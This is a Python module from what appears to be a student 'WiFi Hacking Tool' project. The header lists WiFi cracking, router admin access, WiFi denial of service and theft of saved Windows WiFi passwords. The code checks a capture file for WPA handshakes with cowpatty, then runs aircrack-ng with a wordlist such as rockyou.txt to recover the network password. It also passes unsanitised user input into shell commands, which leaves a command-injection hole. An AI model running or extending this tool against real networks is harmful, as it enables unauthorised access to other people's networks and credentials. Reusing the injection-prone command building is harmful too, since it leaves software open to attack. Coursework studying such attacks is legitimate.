'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WiFi Scanning & Handshake Capture
            2. WiFi Cracking
            3. WAP/Router Admin Control Access
            4. WiFi DOS
            5. Windows Saved WiFi Passwords
============================================================

WPA CRACKING MODULE
'''

import os
import subprocess
import time
import zipfile
import utils.utils as utils

def crack(filename:str):
    if ".cap" not in filename: #Ensure filename has extensions
        filename += ".cap"

    if not os.path.isfile(filename):
        utils.header("WPA Cracking", "Specified file not found.")
        utils.getch()
        return None

    utils.header("WPA Cracking", ["Filename: " + filename, "Checking file for WPA handshakes..."])
    cowpatty_process = subprocess.Popen("cowpatty -c -r " + filename + " -v | grep all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    cowpatty_process.wait()
    res, err = cowpatty_process.communicate()

    if not crackable(res):
        return None
    
    int_dictionary = ["1","2","3","0"]
    str_dictionary = ["words.txt", "rockyou.txt", "Custom dictionary","Cancel"]
    password = ""

    while True:
        utils.header("WPA Cracking", ["Filename: " + filename, "Crackable!"])
        dict_choice = utils.menu(int_dictionary, str_dictionary)
        if utils.valid_choice(dict_choice, int_dictionary):
            break

    dictionary = ""
    if dict_choice == "1":
        dictionary = "dict/words.txt"
    elif dict_choice == "2":
        if not os.path.isfile("dict/rockyou.txt"):
            utils.header("WPA Cracking","Loading rockyou.txt dictionary...")
            subprocess.Popen("gzip -dkc dict/rockyou.txt.gz > dict/rockyou.txt", shell=True, stdout=subprocess.PIPE).wait()
        dictionary = "dict/rockyou.txt"
    elif dict_choice == "3":
        dictionary = input("Enter path & filename (.txt): ")
        if ".txt" not in dictionary:
            dictionary += ".txt"
    elif dict_choice == "0":
        return None
    
    utils.header("WPA Cracking", "Loading processes...")
    aircrackng_command = "aircrack-ng -w " + dictionary + " " + filename + " | grep FOUND"
    aircrackng = subprocess.Popen(aircrackng_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    utils.header("WPA Cracking","Cracking in progress...")

    res, err = aircrackng.communicate()
    raw = str(res.decode("utf-8")+"").split()

    password = str(raw[3])

    return password


def crackable(res):
    return "all" in str(res.decode("utf-8"))